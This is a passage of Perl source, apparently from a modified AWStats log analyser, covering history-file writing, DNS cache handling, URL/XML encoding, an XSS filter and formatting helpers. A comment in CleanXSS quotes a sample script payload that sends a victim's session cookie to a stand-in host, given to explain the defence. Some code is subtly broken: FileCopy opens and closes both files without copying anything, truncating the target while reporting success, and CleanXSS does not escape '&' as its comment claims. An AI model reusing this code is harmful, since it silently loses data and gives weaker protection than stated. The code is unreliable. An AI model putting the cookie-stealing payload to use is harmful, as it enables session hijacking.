		}
		my $e1 = $translate_map{"Errors - Hits - Bandwidth"} // "Errors - Hits - Bandwidth";
		print HISTORYTMP "# $e1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_ERRORS${xmlbs}"
		  . ( scalar keys %_errors_h )
		  . "${xmlbe}\n";
		foreach ( keys %_errors_h ) {
			print HISTORYTMP "${xmlrb}$_${xmlrs}$_errors_h{$_}${xmlrs}"
			  . int( $_errors_k{$_} || 0 )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_ERRORS${xmlee}\n";
	}

	# Trapped errors (SIDER_xxx)
	foreach my $code ( keys %TrapInfosForHTTPErrorCodes ) {
		if ( $sectiontosave eq "sider_$code" ) {
			print HISTORYTMP "\n";
			if ($xml) {
				print HISTORYTMP "<section id='$sectiontosave'><comment>";
			}
			my $te1 = sprintf($translate_map{"URL with %s errors - Hits"} // "URL with %s errors - Hits", $code)
				. ($ShowHTTPErrorsPageDetail =~ /R/i ? " - " . ($translate_map{"Last URL referrer"} // "Last URL referrer") : '')
				. ($ShowHTTPErrorsPageDetail =~ /H/i ? " - " . ($translate_map{"Host"} // "Host") : '');
			print HISTORYTMP "# $te1\n";

			$ValueInFile{$sectiontosave} = tell HISTORYTMP;
			print HISTORYTMP "${xmlbb}BEGIN_SIDER_$code${xmlbs}"
			  . ( scalar keys %{$_sider_h{$code}} )
			  . "${xmlbe}\n";
			foreach ( keys %{$_sider_h{$code}} ) {
				my $newkey = $_;
				my $newreferer = $_referer_h{$code}{$_} || '';
				my $newhost = $_err_host_h{$code}{$_} || '';
				print HISTORYTMP "${xmlrb}"
				  . XMLEncodeForHisto($newkey)
				  . "${xmlrs}$_sider_h{ $code }{$_}"
				  . ($ShowHTTPErrorsPageDetail =~ /R/i ? "${xmlrs}" . XMLEncodeForHisto($newreferer) : '')
				  . ($ShowHTTPErrorsPageDetail =~ /H/i ? "${xmlrs}" . XMLEncodeForHisto($newhost) : '')
				  . "${xmlre}\n";
			}
			print HISTORYTMP "${xmleb}END_SIDER_$code${xmlee}\n";
		}
	}

	# Extra stats sections
	foreach my $extranum ( 1 .. @ExtraName - 1 ) {
		if ( $sectiontosave eq "extra_$extranum" ) {
			print HISTORYTMP "\n";
			if ($xml) {
				print HISTORYTMP "<section id='$sectiontosave'><sortfor>$MaxNbOfExtra[$extranum]</sortfor><comment>";
			}
			print HISTORYTMP "# Extra key - Pages - Hits - Bandwidth - Last access\n";
			print HISTORYTMP "# The $MaxNbOfExtra[$extranum] first number of hits are first\n";
			$ValueInFile{$sectiontosave} = tell HISTORYTMP;
			print HISTORYTMP "${xmlbb}BEGIN_EXTRA_$extranum${xmlbs}"
			  . scalar( keys %{ '_section_' . $extranum . '_h' } )
			  . "${xmlbe}\n";
			&BuildKeyList(
				$MaxNbOfExtra[$extranum],
				$MinHitExtra[$extranum],
				\%{ '_section_' . $extranum . '_h' },
				\%{ '_section_' . $extranum . '_p' }
			);
			%keysinkeylist = ();
			foreach (@keylist) {
				$keysinkeylist{$_} = 1;
				my $page       = ${ '_section_' . $extranum . '_p' }{$_} || 0;
				my $bytes      = ${ '_section_' . $extranum . '_k' }{$_} || 0;
				my $lastaccess = ${ '_section_' . $extranum . '_l' }{$_} || '';
				print HISTORYTMP "${xmlrb}"
				  . XMLEncodeForHisto($_)
				  . "${xmlrs}$page${xmlrs}",
				  ${ '_section_' . $extranum . '_h' }{$_},
				  "${xmlrs}$bytes${xmlrs}$lastaccess${xmlre}\n";
				next;
			}
			foreach ( keys %{ '_section_' . $extranum . '_h' } ) {
				if ( $keysinkeylist{$_} ) { next; }
				my $page       = ${ '_section_' . $extranum . '_p' }{$_} || 0;
				my $bytes      = ${ '_section_' . $extranum . '_k' }{$_} || 0;
				my $lastaccess = ${ '_section_' . $extranum . '_l' }{$_} || '';
				print HISTORYTMP "${xmlrb}"
				  . XMLEncodeForHisto($_)
				  . "${xmlrs}$page${xmlrs}",
				  ${ '_section_' . $extranum . '_h' }{$_},
				  "${xmlrs}$bytes${xmlrs}$lastaccess${xmlre}\n";
				next;
			}
			print HISTORYTMP "${xmleb}END_EXTRA_$extranum${xmlee}\n";
		}
	}

	# Plugin sections
	if ( $AtLeastOneSectionPlugin && $sectiontosave =~ /^plugin_(\w+)$/i ) {
		my $pluginname = $1;
		if ( $PluginsLoaded{'SectionInitHashArray'}{"$pluginname"} ) {

			# my $function="SectionWriteHistory_$pluginname(\$xml,\$xmlbb,\$xmlbs,\$xmlbe,\$xmlrb,\$xmlrs,\$xmlre,\$xmleb,\$xmlee)";
			# eval("$function");
			my $function = "SectionWriteHistory_$pluginname";
			&$function(
				$xml,   $xmlbb, $xmlbs, $xmlbe, $xmlrb,
				$xmlrs, $xmlre, $xmleb, $xmlee
			);
		}
	}

	%keysinkeylist = ();
}

#--------------------------------------------------------------------
# Function:     Rename all temporary history files to final .txt files
# Parameters:   None
# Input:        $DirData, $PROG, $FileSuffix, $DatabaseBreak,
#               $KeepBackupOfHistoricFiles, $SaveDatabaseFilesWithPermissionsForEveryone
# Output:       Creates/updates .txt history files, optional .bak backups,
#               removes temporary .tmp files
# Return:       1 on success (all renamed), 0 on failure (tmp files cleaned up)
#--------------------------------------------------------------------
sub Rename_All_Tmp_History {
	my $pid      = $$;
	my $renameok = 1;

	if ($Debug) {
		debug("Call to Rename_All_Tmp_History (FileSuffix=$FileSuffix)");
	}

	opendir( DIR, "$DirData" );

	my $datemask;
	if    ( $DatabaseBreak eq 'month' ) { $datemask = '\d\d\d\d\d\d'; }
	elsif ( $DatabaseBreak eq 'year' )  { $datemask = '\d\d\d\d'; }
	elsif ( $DatabaseBreak eq 'day' )   { $datemask = '\d\d\d\d\d\d\d\d'; }
	elsif ( $DatabaseBreak eq 'hour' )  { $datemask = '\d\d\d\d\d\d\d\d\d\d'; }
	if ($Debug) {
		debug( "Scan for temp history files to rename into DirData='$DirData' with mask='$datemask'"
		);
	}

	my $regfilesuffix = quotemeta($FileSuffix);
	foreach ( grep /^$PROG($datemask)$regfilesuffix\.tmp\.$pid$/, file_filt(sort readdir DIR) )
	{
		/^$PROG($datemask)$regfilesuffix\.tmp\.$pid$/;
		if ($renameok) {    # No rename error yet
			if ($Debug) {
				debug( " Rename new tmp history file $PROG$1$FileSuffix.tmp.$$ into $PROG$1$FileSuffix.txt", 1 );
			}
			if ( -s "$DirData/$PROG$1$FileSuffix.tmp.$$" )
			{               # Rename tmp files if size > 0
				if ($KeepBackupOfHistoricFiles) {
					if ( -s "$DirData/$PROG$1$FileSuffix.txt" )
					{       # History file already exists. We backup it
						if ($Debug) {
							debug( " Make a backup of old history file into $PROG$1$FileSuffix.bak before", 1 );
						}
						if (
							rename(
								"$DirData/$PROG$1$FileSuffix.txt",
								"$DirData/$PROG$1$FileSuffix.bak"
							) == 0
						)
						{
							warning( "Warning: Failed to make a backup of \"$DirData/$PROG$1$FileSuffix.txt\" into \"$DirData/$PROG$1$FileSuffix.bak\"."
							);
						}
						if ($SaveDatabaseFilesWithPermissionsForEveryone) {
							chmod 0666, "$DirData/$PROG$1$FileSuffix.bak";
						}
					}
					else {
						if ($Debug) {
							debug( "  No need to backup old history file", 1 );
						}
					}
				}
				if (
					rename(
						"$DirData/$PROG$1$FileSuffix.tmp.$$",
						"$DirData/$PROG$1$FileSuffix.txt"
					) == 0
				)
				{
					$renameok = 0;
					unlink "$DirData/$PROG$1$FileSuffix.tmp.$$";
					warning( "Warning: Failed to rename \"$DirData/$PROG$1$FileSuffix.tmp.$$\" into \"$DirData/$PROG$1$FileSuffix.txt\".\nWrite permissions on \"$PROG$1$FileSuffix.txt\" might be wrong"
						. (
							$ENV{'GATEWAY_INTERFACE'}
							? " for an 'update from web'"
							: ""
						)
						. " or file might be opened."
					);
					next;
				}
				if ($SaveDatabaseFilesWithPermissionsForEveryone) {
					chmod 0666, "$DirData/$PROG$1$FileSuffix.txt";
				}
			}
		}
		else {    # Because of rename error, we remove all remaining tmp files
			unlink "$DirData/$PROG$1$FileSuffix.tmp.$$";
		}
	}
close DIR;
return $renameok;
}

#------------------------------------------------------------------------------
# Function:     Load DNS cache file entries into a memory hash array
# Parameters:	Hash array ref to load into,
#               File name to load,
#				File suffix to use
#               Save to a second plugin file if not up to date
# Input:		None
# Output:		Hash array is loaded
# Return:		1 No DNS Cache file found, 0 OK
#------------------------------------------------------------------------------
sub Read_DNS_Cache {
	my $hashtoload   = shift;
	my $dnscachefile = shift;
	my $filesuffix   = shift;
	my $savetohash   = shift;

	my $dnscacheext = '';
	my $filetoload  = '';
	my $timetoload  = time();

	if ($Debug) { debug("Call to Read_DNS_Cache [file=\"$dnscachefile\"]"); }
	if ( $dnscachefile =~ s/(\.\w+)$// ) { $dnscacheext = $1; }
	foreach my $dir ( "$DirData", ".", "" ) {
		my $searchdir = $dir;
		if (   $searchdir
			&& ( !( $searchdir =~ /\/$/ ) )
			&& ( !( $searchdir =~ /\\$/ ) ) )
		{
			$searchdir .= "/";
		}
		if ( -f "${searchdir}$dnscachefile$filesuffix$dnscacheext" ) {
			$filetoload = "${searchdir}$dnscachefile$filesuffix$dnscacheext";
		}

		# Plugin call : Change filetoload
		if ( $PluginsLoaded{'SearchFile'}{'hashfiles'} ) {
			SearchFile_hashfiles(
				$searchdir,   $dnscachefile, $filesuffix,
				$dnscacheext, $filetoload
			);
		}
		if ($filetoload) { last; }    # We found a file to load
	}

	if ( !$filetoload ) {
		if ($Debug) { debug(" No DNS Cache file found"); }
		return 1;
	}

	# Plugin call : Load hashtoload
	if ( $PluginsLoaded{'LoadCache'}{'hashfiles'} ) {
		LoadCache_hashfiles( $filetoload, $hashtoload );
	}
	if ( !scalar keys %$hashtoload ) {
		open( DNSFILE, "$filetoload" )
		  or error("Couldn't open DNS Cache file \"$filetoload\": $!");

		#binmode DNSFILE;		
		# If we set binmode here, it seems that the load is broken on ActiveState 5.8
		# This is a fast way to load with regexp
		%$hashtoload =
		  map( /^(?:\d{0,10}\s+)?([0-9A-F:\.]+)\s+([^\s]+)$/oi, <DNSFILE> );
		close DNSFILE;
		if ($savetohash) {

			# Plugin call : Save hash file (all records) with test if up to date to save
			if ( $PluginsLoaded{'SaveHash'}{'hashfiles'} ) {
				SaveHash_hashfiles( $filetoload, $hashtoload, 1, 0 );
			}
		}
	}
	if ($Debug) {
		debug(
			" Loaded "
			  . ( scalar keys %$hashtoload )
			  . " items from $filetoload in "
			  . ( time() - $timetoload )
			  . " seconds.",
			1
		);
	}
	return 0;
}

#------------------------------------------------------------------------------
# Function:     Save a memory hash array into a DNS cache file
# Parameters:	Hash array ref to save,
#               File name to save,
#				File suffix to use
# Input:		None
# Output:		None
# Return:		0 OK, 1 Error
#------------------------------------------------------------------------------
sub Save_DNS_Cache_File {
	my $hashtosave   = shift;
	my $dnscachefile = shift;
	my $filesuffix   = shift;

	my $dnscacheext    = '';
	my $filetosave     = '';
	my $timetosave     = time();
	my $nbofelemtosave = $NBOFLASTUPDATELOOKUPTOSAVE;
	my $nbofelemsaved  = 0;

	if ($Debug) {
		debug("Call to Save_DNS_Cache_File [file=\"$dnscachefile\"]");
	}
	if ( !scalar keys %$hashtosave ) {
		if ($Debug) { debug(" No data to save"); }
		return 0;
	}
	if ( $dnscachefile =~ s/(\.\w+)$// ) { $dnscacheext = $1; }
	$filetosave = "$dnscachefile$filesuffix$dnscacheext";

	# Plugin call : Save hash file (only $NBOFLASTUPDATELOOKUPTOSAVE records) with no test if up to date
	if ( $PluginsLoaded{'SaveHash'}{'hashfiles'} ) {
		SaveHash_hashfiles( $filetosave, $hashtosave, 0, $nbofelemtosave,
			$nbofelemsaved );
		if ($SaveDatabaseFilesWithPermissionsForEveryone) {
			chmod 0666, "$filetosave";
		}
	}
	if ( !$nbofelemsaved ) {
		$filetosave = "$dnscachefile$filesuffix$dnscacheext";
		if ($Debug) {
			debug(
				" Save data "
				  . (
					$nbofelemtosave
					? "($nbofelemtosave records max)"
					: "(all records)"
				  )
				  . " into file $filetosave"
			);
		}
		if ( !open( DNSFILE, ">$filetosave" ) ) {
			warning( "Warning: Failed to open for writing last update DNS Cache file \"$filetosave\": $!" );
			return 1;
		}
		binmode DNSFILE;
		my $starttimemin = int( $starttime / 60 );
		foreach my $key ( keys %$hashtosave ) {

			#if ($hashtosave->{$key} ne '*') {
			my $ipsolved = $hashtosave->{$key};
			print DNSFILE "$starttimemin\t$key\t"
			  . ( $ipsolved eq 'ip' ? '*' : $ipsolved )
			  . "\n";    # Change 'ip' to '*' for backward compatibility
			if ( ++$nbofelemsaved >= $NBOFLASTUPDATELOOKUPTOSAVE ) { last; }

			#}
		}
		close DNSFILE;

		if ($SaveDatabaseFilesWithPermissionsForEveryone) {
			chmod 0666, "$filetosave";
		}

	}
	if ($Debug) {
		debug(
			" Saved $nbofelemsaved items into $filetosave in "
			  . ( time() - $timetosave )
			  . " seconds.",
			1
		);
	}
	return 0;
}

#------------------------------------------------------------------------------
# Function:     Return time elapsed since last call in miliseconds
# Parameters:	0|1 (0 reset counter, 1 no reset)
# Input:		None
# Output:		None
# Return:		Number of miliseconds elapsed since last call
#------------------------------------------------------------------------------
sub GetDelaySinceStart {
	if (shift) { $StartSeconds = 0; }    # Reset chrono
	my ( $newseconds, $newmicroseconds ) = ( time(), 0 );

	# Plugin call : Return seconds and milliseconds
	if ( $PluginsLoaded{'GetTime'}{'timehires'} ) {
		GetTime_timehires( $newseconds, $newmicroseconds );
	}
	if ( !$StartSeconds ) {
		$StartSeconds      = $newseconds;
		$StartMicroseconds = $newmicroseconds;
	}
	return ( ( $newseconds - $StartSeconds ) * 1000 +
		  int( ( $newmicroseconds - $StartMicroseconds ) / 1000 ) );
}

#------------------------------------------------------------------------------
# Function:     Change word separators of a keyphrase string into space and
#               remove bad coded chars
# Parameters:	stringtodecode
# Input:        None
# Output:       None
# Return:		decodedstring
#------------------------------------------------------------------------------
sub ChangeWordSeparatorsIntoSpace {
	$_[0] =~ s/%0[ad]/ /ig;          # LF CR
	$_[0] =~ s/%2[02789abc]/ /ig;    # space " ' ( ) * + ,
	$_[0] =~ s/%3a/ /ig;             # :
	$_[0] =~
	  tr/\+\'\(\)\"\*,:/ /s;    # "&" and "=" must not be in this list
}

#------------------------------------------------------------------------------
# Function:		Transforms special chars by entities as needed in XML/XHTML
# Parameters:	stringtoencode
# Return:		encodedstring
#------------------------------------------------------------------------------
sub XMLEncode {
	if ( $BuildReportFormat ne 'xhtml' && $BuildReportFormat ne 'xml' ) {
		return shift;
	}
	my $string = shift;
	$string =~ s/&/&amp;/g;
	$string =~ s/</&lt;/g;
	$string =~ s/>/&gt;/g;
	$string =~ s/\"/&quot;/g;
	$string =~ s/\'/&apos;/g;
	return $string;
}

#------------------------------------------------------------------------------
# Function:		Transforms spaces into %20 and special chars by HTML entities as needed in XML/XHTML
#				Decoding is done by XMLDecodeFromHisto.
#				AWStats data files are stored in ISO-8859-1.
# Parameters:	stringtoencode
# Return:		encodedstring
#------------------------------------------------------------------------------
sub XMLEncodeForHisto {
	my $string = shift;
	$string =~ s/\s/%20/g;
	if ( $BuildHistoryFormat ne 'xml' ) { return $string; }
	$string =~ s/=/%3d/g;
	$string =~ s/&/&amp;/g;
	$string =~ s/</&lt;/g;
	$string =~ s/>/&gt;/g;
	$string =~ s/\"/&quot;/g;
	$string =~ s/\'/&apos;/g;
	return $string;
}

#------------------------------------------------------------------------------
# Function:     Encode a string to UTF-8 for page output
# Parameters:   $string - String to encode
# Return:       UTF-8 encoded string
# Note:         AWStats output is always UTF-8, no encoding needed
#------------------------------------------------------------------------------
sub EncodeToPageCode {
	return shift;
}

#------------------------------------------------------------------------------
# Function:     Encode a binary string into ASCII-safe URL encoding
# Description:  Converts binary strings to URL-encoded ASCII format.
#               '+' is encoded as '%2B', non-ASCII bytes (0x80-0xFF) are
#               percent-encoded, and spaces are converted to '+'.
# Parameters:   $string - Binary string to encode
# Input:        None
# Output:       None
# Return:       URL-encoded ASCII string
# Note:         Used for safe transmission in HTTP headers/requests
#------------------------------------------------------------------------------
sub EncodeString {
	my $string = shift;
	#	use bytes;
	$string =~ s/([\x2B\x80-\xFF])/sprintf("%%%02X", ord($1))/eg;
	#	no bytes;
	$string =~ tr/ /+/s;
	return $string;
}

#------------------------------------------------------------------------------
# Function:     Decode URL-encoded string to binary string with XSS protection
# Description:  Converts percent-encoded URLs back to original strings,
#               replaces '+' with spaces, removes quotes, and applies XSS
#               filtering to prevent cross-site scripting attacks.
# Parameters:   $stringtodecode - URL-encoded string (e.g., 'hello%20world')
# Input:        None
# Output:       None
# Return:       Decoded and sanitized string
# Note:         Removes both single and double quotes for security
#------------------------------------------------------------------------------
sub DecodeEncodedString {
	my $stringtodecode = shift;
	$stringtodecode =~ tr/\+/ /s;
	$stringtodecode =~ s/%([A-F0-9][A-F0-9])/pack("C", hex($1))/ieg;
	$stringtodecode =~ s/["']//g;
	$stringtodecode = CleanXSS($stringtodecode);
	return $stringtodecode;
}

#------------------------------------------------------------------------------
# Function:     Decode RFC3986 unreserved characters from URL encoding
# Description:  Decodes percent-encoded sequences for common unreserved
#               characters (A-Y, a-y, 0-9, -, ., _, ~). Z/z are intentionally
#               excluded as they rarely appear encoded in logs.
# Parameters:   $stringtodecode - String containing URL-encoded characters
# Return:       Decoded string
#------------------------------------------------------------------------------
sub DecodeRFC3986UnreservedString {
	my $stringtodecode = shift;
	$stringtodecode =~ s/%([46][1-9A-F]|[57][0-9A]|3[0-9]|2D|2E|5F|7E)/pack("C", hex($1))/ieg;
	return $stringtodecode;
}

#------------------------------------------------------------------------------
# Function:     Extract original regex pattern from a compiled regex object
# Description:  Converts a precompiled regex (created with qr//) back to its
#               original string pattern by extracting the content between
#               the parentheses after the modifiers.
# Parameters:   $compiled_regex - Precompiled regex object (e.g., qr/pattern/)
# Input:        None
# Output:       None
# Return:       Original regex pattern as string (e.g., '^test$')
# Note:         Pattern: (?modifiers:pattern) -> extracts 'pattern'
#------------------------------------------------------------------------------
sub UnCompileRegex {
	shift =~ /\(\?[-^\w]*:(.*)\)/;
	# shift =~ /\(\?[-\w]*:(.*)\)/;# perl 5.14
	return $1;
}

#------------------------------------------------------------------------------
# Function:     Clean a string of all chars that are not char or _ - \ / . \s
# Parameters:   stringtoclean, full
# Input:        None
# Output:       None
# Return:		cleanedstring
#------------------------------------------------------------------------------
sub Sanitize {
	my $stringtoclean = shift;
	my $full = shift || 0;
	if ($full) {
		$stringtoclean =~ s/[^\w\d]//g;
	}
	else {
		$stringtoclean =~ s/[^\w\d\-\\\/\.:\s]//g;
	}
	return $stringtoclean;
}

#------------------------------------------------------------------------------
# Function:     Clean a string to prevent Cross-Site Scripting (XSS) attacks
#               and remove '|' character (AWStats internal separator).
#
# Description:
#     XSS attack example: An attacker injects 
#         <script>document.write("<img src=https://example.com/page.php?" + document.cookie)</script>
#     into AWStats URL. When the page loads, the victim's browser sends its session
#     cookie to the attacker, allowing session hijacking.
#
#     This function sanitizes all user input by:
#     - Escaping HTML special chars (&, <, >)
#     - Removing javascript: protocol
#     - Removing event handler attributes (onclick, onload, etc.)
#     - Removing '|' character
#
# Parameters:   stringtoclean
# Return:       cleanedstring (safe for HTML output)
#------------------------------------------------------------------------------
sub CleanXSS {
	my $stringtoclean = shift;
	
	$stringtoclean =~ s/javascript\s*://gi;
	$stringtoclean =~ s/\s+on\w+\s*=\s*["'][^"']*["']//gi;
	$stringtoclean =~ s/\s+on\w+\s*=\s*[^\s>]+//gi;
	$stringtoclean =~ s/\|//g;
	$stringtoclean =~ s/</&lt;/g;
	$stringtoclean =~ s/>/&gt;/g;
	
	return $stringtoclean;
}

#------------------------------------------------------------------------------
# Function:     Decode XML-encoded strings from history files
# Description:  Converts encoded content in AWStats history files (.txt) back
#               to original strings by removing HTML tags and decoding
#               URL-encoded and HTML-encoded characters.
# Parameters:   $stringtoclean - Encoded string from history file
# Output:       None
# Return:       Decoded original string
# Note:         AWStats data files are stored with XML/HTML encoding
#------------------------------------------------------------------------------
sub XMLDecodeFromHisto {
	my $stringtoclean = shift;
	$stringtoclean =~ s/$regclean1/ /g;
	$stringtoclean =~ s/$regclean2//g;
	$stringtoclean =~ s/%20/ /g;
	$stringtoclean =~ s/%3d/=/g;
	$stringtoclean =~ s/&amp;/&/g;
	$stringtoclean =~ s/&lt;/</g;
	$stringtoclean =~ s/&gt;/>/g;
	$stringtoclean =~ s/&quot;/\"/g;
	$stringtoclean =~ s/&apos;/\'/g;
	return $stringtoclean;
}

#------------------------------------------------------------------------------
# Function:     Copy one file into another
# Parameters:   sourcefilename targetfilename
# Input:        None
# Output:       None
# Return:		0 if copy is ok, 1 else
#------------------------------------------------------------------------------
sub FileCopy {
	my $filesource = shift;
	my $filetarget = shift;
	if ($Debug) { debug( "FileCopy($filesource,$filetarget)", 1 ); }
	open( FILESOURCE, "$filesource" )  || return 1;
	open( FILETARGET, ">$filetarget" ) || return 1;
	binmode FILESOURCE;
	binmode FILETARGET;
	close(FILETARGET);
	close(FILESOURCE);
	if ($Debug) { debug( " File copied", 1 ); }
	return 0;
}

#------------------------------------------------------------------------------
# Function:     Format a QUERY_STRING
# Parameters:   query
# Input:        None
# Output:       None
# Return:		formatted query
#------------------------------------------------------------------------------
# TODO Appeller cette fonction partout ou il y a des NewLinkParams
sub CleanNewLinkParamsFrom {
	my $NewLinkParams = shift;
	while ( my $param = shift ) {
		$NewLinkParams =~ s/(^|&|&amp;)$param(=[^&]*|$)//i;
	}
	
	$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
	$NewLinkParams =~ s/^&amp;//;
	$NewLinkParams =~ s/&amp;$//;
	return $NewLinkParams;
}

#------------------------------------------------------------------------------
# Function:     Show language flag links for switching interface language
# Description:  Displays emoji flags for each language in ShowFlagLinks config,
#               allowing users to switch the AWStats interface language.
# Parameters:   $CurrentLang - Current language code (e.g., 'en-us', 'zh-cn')
# Input:        $QueryString, $AWScript, $SiteConfig, $YearRequired, $MonthRequired,
#               $ShowFlagLinks, $LangBrowserToLangAwstats, $FrameName, $StaticLinks
# Output:       HTML anchor tags with flag emojis
# Return:       None
# Note:         Flags are displayed as emoji (e.g., 🇺🇸, 🇨🇳) instead of PNG images
#------------------------------------------------------------------------------
sub Show_Flag_Links {
	my $CurrentLang = shift;

	# Build flags link
	my $NewLinkParams = $QueryString;
	my $NewLinkTarget = '';
	
	if ( $ENV{'GATEWAY_INTERFACE'} ) {
		# CGI mode: clean URL parameters
		$NewLinkParams = CleanNewLinkParamsFrom( $NewLinkParams,
			( 'update', 'staticlinks', 'framename', 'lang' ) );
		$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
		$NewLinkParams =~ s/(^|&|&amp;)lang=[^&]*//i;
		$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
		$NewLinkParams =~ s/^&amp;//;
		$NewLinkParams =~ s/&amp;$//;
		if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }

		if ( $FrameName eq 'mainright' ) {
			$NewLinkTarget = " target=\"_parent\"";
		}
	}
	else {
		# Static/CLI mode: build minimal parameters
		$NewLinkParams = ( $SiteConfig ? "config=$SiteConfig&amp;" : "" )
					   . "year=$YearRequired&amp;month=$MonthRequired&amp;";
	}
	
	# Ensure output parameter is set
	if ( $NewLinkParams !~ /output=/ ) { $NewLinkParams .= 'output=main&amp;'; }
	
	# Preserve frame context
	if ( $FrameName eq 'mainright' ) {
		$NewLinkParams .= 'framename=index&amp;';
	}

	# Output flag links for each configured language
	foreach my $lng ( split( /\s+/, $ShowFlagLinks ) ) {
		# Map browser language code to AWStats language code
		$lng = $LangBrowserToLangAwstats{$lng} ? $LangBrowserToLangAwstats{$lng} : $lng;
		
		# Skip current language
		if ( $lng ne $CurrentLang ) {
			my $lngtitle = _t("language_$lng") || $lng;
			print "<a href=\""
				. XMLEncode("$AWScript${NewLinkParams}lang=$lng")
				. "\"$NewLinkTarget title=\"$lngtitle\">" 
				. country_code_to_emoji($lng)
				. "</a>&nbsp;\n";
		}
	}
}

#------------------------------------------------------------------------------
# Function:     Format bytes to human readable string (Bytes, KB, MB, GB, TB)
# Parameters:   bytes - integer byte value or "0.00"
# Return:       Formatted string like "1.23 MB" or "456 Bytes"
#------------------------------------------------------------------------------
sub Format_Bytes {
	my $bytes = shift || 0;
	my $fudge = 1;

	if ( $bytes >= ( $fudge << 40 ) ) {
		return sprintf( "%.2f", $bytes / 1099511627776 ) . " " . _t("TB");
	}
	if ( $bytes >= ( $fudge << 30 ) ) {
		return sprintf( "%.2f", $bytes / 1073741824 ) . " " . _t("GB");
	}
	if ( $bytes >= ( $fudge << 20 ) ) {
		return sprintf( "%.2f", $bytes / 1048576 ) . " " . _t("MB");
	}
	if ( $bytes >= ( $fudge << 10 ) ) {
		return sprintf( "%.2f", $bytes / 1024 ) . " " . _t("KB");
	}
	if ( $bytes < 0 ) { $bytes = "?"; }
	return int($bytes) . ( int($bytes) ? " " . _t("Bytes") : "" );
}

#------------------------------------------------------------------------------
# Function:		Format a number with thousands separator
# CL: courtesy of https://www.perlmonks.org/?node_id=2145
# Parameters:   number
# Input:        None
# Output:       None
# Return:       "999,999,999,999"
#------------------------------------------------------------------------------
sub Format_Number {
	my $number = shift || 0;
	$number =~ s/(\d)(\d\d\d)$/$1 $2/;
	$number =~ s/(\d)(\d\d\d\s\d\d\d)$/$1 $2/;
	$number =~ s/(\d)(\d\d\d\s\d\d\d\s\d\d\d)$/$1 $2/;
	
	# 从翻译映射获取千位分隔符，默认为空格
	my $separator = _t("thousands_separator");
	if ($separator eq '' || $separator eq "thousands_separator") {
		$separator = ' ';
	}
	
	$number =~ s/ /$separator/g;
	return $number;
}

#------------------------------------------------------------------------------
# Function:		Return " alt=string title=string"
# Parameters:   string
# Input:        None
# Output:       None
# Return:       "alt=string title=string"
#------------------------------------------------------------------------------
sub AltTitle {
	my $string = shift || '';
	return " alt='$string' title='$string'";

	#	return " alt=\"$string\" title=\"$string\"";
	#	return ($BuildReportFormat?"":" alt=\"$string\"")." title=\"$string\"";
}

#------------------------------------------------------------------------------
# Function:		Tell if an email is a local or external email
# Parameters:   email
# Input:        $SiteDomain(exact string) $HostAliases(quoted regex string)
# Output:       None
# Return:       -1, 0 or 1
#------------------------------------------------------------------------------
sub IsLocalEMail {
	my $email = shift || 'unknown';
	if ( $email !~ /\@(.*)$/ ) { return 0; }
	my $domain = $1;
	if ( $domain =~ /^$SiteDomain$/i ) { return 1; }
	foreach (@HostAliases) {
		if ( $domain =~ /$_/ ) { return 1; }
	}
	return -1;
}

#------------------------------------------------------------------------------
# Function:		Format a date according to Message[78] (country date format)
# Parameters:   String date YYYYMMDDHHMMSS
#               Option 0=LastUpdate and LastTime date
#                      1=Arrays date except daymonthvalues
#                      2=daymonthvalues date (only year month and day)
# Input:        $Message[78]
# Output:       None
# Return:       Date with format defined by Message[78] and option
#------------------------------------------------------------------------------
sub Format_Date {
	my $date       = shift;
	my $option     = shift || 0;
	if (defined &FormatDate_localdate) {
		my $result = FormatDate_localdate($date, $Lang, $option);
		return $result if defined $result;
	}
	my $year       = substr( "$date", 0, 4 );
	my $month      = substr( "$date", 4, 2 );
	my $day        = substr( "$date", 6, 2 );
	my $hour       = substr( "$date", 8, 2 );
	my $min        = substr( "$date", 10, 2 );
	my $sec        = substr( "$date", 12, 2 );
	
	my $dateformat;
	if ($option == 0) {
		$dateformat = _t("dateformat_long");
	}
	else {
		$dateformat = _t("dateformat_short");
	}
	
	$dateformat =~ s/yyyy/$year/g;
	$dateformat =~ s/yy/$year/g;
	$dateformat =~ s/mmm/_t($MonthNumLib{$month})/ge;
	$dateformat =~ s/mm/$month/g;
	$dateformat =~ s/dd/$day/g;
	$dateformat =~ s/HH/$hour/g;
	$dateformat =~ s/MM/$min/g;
	$dateformat =~ s/SS/$sec/g;
	
	return "$dateformat";
}

#------------------------------------------------------------------------------
# Function:     Return 1 if string contains only ascii chars
# Parameters:   string
# Input:        None
# Output:       None
# Return:       0 or 1
#------------------------------------------------------------------------------
sub IsAscii {
	my $string = shift;
	
	if ($Debug) { debug( "IsAscii($string)", 5 ); }
	
	if ( $string =~ /^[\w\+\-\/\\\.%,;:=\"\'&?!\s]+$/ ) {
		if ($Debug) { debug( " Yes", 6 ); }
		return 1;
	}
	
	if ($Debug) { debug( " No", 6 ); }
	return 0;
}

#------------------------------------------------------------------------------
# Function:     Return the lower value between 2 but exclude value if 0
# Parameters:   Val1 and Val2
# Input:        None
# Output:       None
# Return:       min(Val1,Val2)
#------------------------------------------------------------------------------
sub MinimumButNoZero {
	my ( $val1, $val2 ) = @_;
	return ( $val1 && ( $val1 < $val2 || !$val2 ) ? $val1 : $val2 );
}

#------------------------------------------------------------------------------
# Function:     Add a value to the sorting tree
# Description:  Inserts a (key, value) pair into the tree structure. The tree
#               maintains the top N largest values. When a value already exists,
#               it's stored in egal hash for equal-value handling.
# Parameters:   $keytoadd - The key to add
#               $keyval   - The numeric value associated with the key
#               $firstadd - Set to 1 for the first insertion (optional)
# Input:        %val, %egal, %nextval, $lowerval
# Output:       Updated %val, %egal, %nextval, and $lowerval
# Return:       None
#------------------------------------------------------------------------------
sub AddInTree {
	my $keytoadd = shift;
	my $keyval   = shift;
	my $firstadd = shift || 0;
	# Val is the first one
	if ( $firstadd == 1 ) {
		if ($Debug) { debug( "  firstadd", 4 ); }
		$val{$keyval} = $keytoadd;
		$lowerval = $keyval;
		if ($Debug) {
			debug( " lowerval=$lowerval, nb elem val="
				  . ( scalar keys %val )
				  . ", nb elem egal="
